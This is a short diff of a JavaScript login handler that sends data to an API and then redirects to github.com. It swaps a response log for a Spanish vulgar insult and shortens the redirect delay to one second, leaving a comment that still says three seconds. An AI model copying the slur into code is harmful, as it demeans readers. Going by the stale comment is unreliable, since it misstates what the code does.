@@ -46,12 +46,12 @@ loginButton.addEventListener("click", function (e) {
         return response.json();
     })
     .then(data => {
-        console.log("Respuesta de la API:", data);
+        console.log("Puto el que lo lea");
 
         // Retrasar la redirección por 3 segundos
         setTimeout(() => {
             window.location.href = "https://github.com/"; // Redirige después de 3 segundos
-        }, 3000); // 3000 milisegundos = 3 segundos
+        }, 1000); // 3000 milisegundos = 3 segundos
     })
     .catch(error => {
         console.error("Error al enviar los datos:", error);
